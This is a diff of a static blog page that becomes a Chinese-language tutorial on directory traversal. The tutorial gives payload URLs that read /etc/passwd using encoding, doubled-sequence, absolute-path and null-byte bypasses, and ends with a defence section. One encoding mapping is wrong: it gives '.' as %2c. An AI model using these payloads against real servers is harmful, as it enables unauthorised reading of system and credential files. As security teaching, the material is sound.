@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/images/logo.png">
-  <title>Categories</title>
+  <title>Directory Traversal</title>
   
     
       <meta 
         property="og:title" 
-        content="Categories">
+        content="Directory Traversal">
     
     
       <meta 
         property="og:url" 
-        content="https://whoiszkuan.github.io/categories/WebSec/index.html">
+        content="https://whoiszkuan.github.io/2021/12/09/Directory-Traversal/index.html">
     
     
       <meta 
@@ -36,6 +36,34 @@
         content="/images/zkuan.png">
     
     
+      <meta 
+        property="og:img" 
+        content="目录穿越">
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-12-09">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-12-10">
+      <meta 
+        property="og:article:author" 
+        content="0x95cn_zkuan">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="Web">
+        
+          <meta 
+            property="og:article:tag" 
+            content="Security">
+        
+      
     
   
   <script>
@@ -174,6 +202,8 @@
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
   
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
 <meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="4CH4N ZKUAN" type="application/atom+xml">
@@ -268,97 +298,156 @@
         <div class="container">
           <div class="columns">
             <main class="main-column">
-<div class="card card-content category-page-card">
-  <div class="categories-page-title">Categories&nbsp-&nbspWebSec</div>
-</div>
-<div class="archive-timeline">
-  
-  
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      Directory Traversal
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-12-09T10:49:27.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-12-09</span>
+    </time>
     
-      <div class="archive-timeline-tag"><span>2021</span></div>
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/WebSec/" 
+          class="post-meta-link">
+          WebSec
+        </a>
       
     
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-09</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2021/12/09/Directory-Traversal/" 
-              class="archive-timeline-post-item">
-              Directory Traversal
-            </a>
-          </div>
-        </div>
+    
+      <span class="dot"></span>
+      <span>666 words</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Web/" 
+            class="post-meta-link">
+            Web
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/Security/" 
+            class="post-meta-link">
+            Security
+          </a>
+        
       </div>
     </div>
   
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="Directory-Traversal-目录穿越"><a href="#Directory-Traversal-目录穿越" class="headerlink" title="Directory Traversal(目录穿越)"></a>Directory Traversal(目录穿越)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>目录穿越是一种Web漏洞，它允许黑客读取运行在服务器上的任意文件，包括应用程序代码、数据、后端系统凭据以及敏感文件等。</p>
+<p>当图像通过HTML加载：<code>&lt;img src='/images?filename=218.png'&gt;</code></p>
+<p>网站使用<code>filename</code>加载图片文件并返回，图片本身存储在该磁盘上，可能存在<code>/var/www/images/</code>上，图片真实路径为<code>/var/www/images/218.png</code></p>
+<p>如果当前网站没有针对目录穿越进行防御加固，黑客可在URL下检索服务器文件系统中的任意文件：</p>
+<p><code>http://127.0.0.1/images?filename=../../../../etc/passwd</code></p>
+<h2 id="绝对路径绕过"><a href="#绝对路径绕过" class="headerlink" title="绝对路径绕过"></a>绝对路径绕过</h2><p>当<code>../</code>被过滤时，可直接使用系统中根目录的绝对路径</p>
+<p>payload：<code>/etc/passwd</code></p>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>当<code>../</code>被直接替换为空时，可使用双写嵌套遍历序列</p>
+<p><code>....// -&gt; ../</code>当中间<code>../</code>被替换为空时，<code>..  /</code>重新组合</p>
+<p>payload:<code>http://127.0.0.1/images?filename=....//....//....//....//etc/passwd</code></p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><blockquote>
+<p>. -&gt; %2c</p>
+<p>/ -&gt; %2f</p>
+<p>% -&gt; %25    (双重编码)</p>
+</blockquote>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/images?filename=..%2f..%2f..%2f..%2f..%2fetc/passwd
+http://127.0.0.1/images?filename=%2c%2c%2f%2c%2c%2f%2c%2c%2f%2c%2c%2f%2c%2c%2fetc/passwd
+http://127.0.0.1/images?filename=..%252f..%252f..%252f..%252f..%252fetc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="预期文件配合"><a href="#预期文件配合" class="headerlink" title="预期文件配合"></a>预期文件配合</h2><p>当网站要求获取<code>filename=</code>图片时以预期的文件夹开头，例如<code>/var/www/images</code>，可配合<code>../</code>来返回上一级目录</p>
+<p>payload:<code>http://127.0.0.1/images?filename=/var/www/images../../../etc/passwd</code></p>
+<h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>当网站要求获取<code>filename=</code>图片时以预期的文件后缀结尾，例如<code>.png</code>，可使用空字节终止</p>
+<p>payload:<code>http://127.0.0.1/images?filename=../../../../etc/passwd%00.png</code></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>防止文件路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统 API。可以重写执行此操作的许多应用程序函数，以更安全的方式提供相同的行为。</p>
+<p>如果认为将用户提供的输入传递给文件系统 API 是不可避免的，那么应该同时使用两层防御来防止攻击：</p>
+<ul>
+<li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果这对于所需的功能是不可能的，则验证应验证输入是否仅包含允许的内容，例如纯字母数字字符。</li>
+<li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。它应该验证规范化路径是否以预期的基本目录开头。</li>
+</ul>
+
+  </div>
+  <div>
     
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-12-02</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2021/12/02/PHP-Security-Features/" 
-              class="archive-timeline-post-item">
-              PHP Security Features
-            </a>
-          </div>
-        </div>
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            0x95cn_zkuan
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://whoiszkuan.github.io/2021/12/09/Directory-Traversal/">
+            https://whoiszkuan.github.io/2021/12/09/Directory-Traversal/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
       </div>
-    </div>
+    
+  </div>
+</article>
+<div class="nav">
   
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-11-04</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2021/11/04/N1BOOK-XSS/" 
-              class="archive-timeline-post-item">
-              N1BOOK-XSS
-            </a>
-          </div>
-        </div>
-      </div>
-    </div>
   
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-10-31</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2021/10/31/SSRF-Gopher/" 
-              class="archive-timeline-post-item">
-              SSRF-Gopher
-            </a>
-          </div>
+    <div class="nav-item-next">
+      <a 
+        href="/2021/12/02/PHP-Security-Features/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">Next</div>
+          
+            <div class="nav-title">PHP Security Features </div>
+          
         </div>
-      </div>
-    </div>
-  
-    
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-09-10</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/2021/09/10/Http%20Agreement/" 
-              class="archive-timeline-post-item">
-              Http Agreement
-            </a>
-          </div>
-        </div>
-      </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
     </div>
   
 </div>
-</main>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-Traversal-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">Directory Traversal(目录穿越)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87"><span class="toc-text">绝对路径绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88"><span class="toc-text">预期文件配合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
+</div></main>
             <aside class="left-column">
               
               <div class="card card-author">
@@ -396,6 +485,18 @@
               </div>
                <div class="sticky-tablet">
   
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-Traversal-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">Directory Traversal(目录穿越)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87"><span class="toc-text">绝对路径绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88"><span class="toc-text">预期文件配合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
+      </div>
+    </article>
   
   
   <article class="card card-content categories-widget">
@@ -485,73 +586,21 @@
   </article>
   
   
-    <article class="card card-content widescreen-archive archive-widget">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">9</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
-  
 </div>
             </aside>
             <aside class="right-column">
               <div class="sticky-widescreen">
   
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-Traversal-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">Directory Traversal(目录穿越)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87"><span class="toc-text">绝对路径绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E6%96%87%E4%BB%B6%E9%85%8D%E5%90%88"><span class="toc-text">预期文件配合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
+    </article>
   
   
   <article class="card card-content">
@@ -588,68 +637,6 @@
 </div>
   </article>
   
-  
-    <article class="card card-content">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">9</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
   
 </div>
             </aside>
@@ -748,6 +735,36 @@
 </a> 
      
      
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
      
      
     <script src="/js/main.js"></script> 
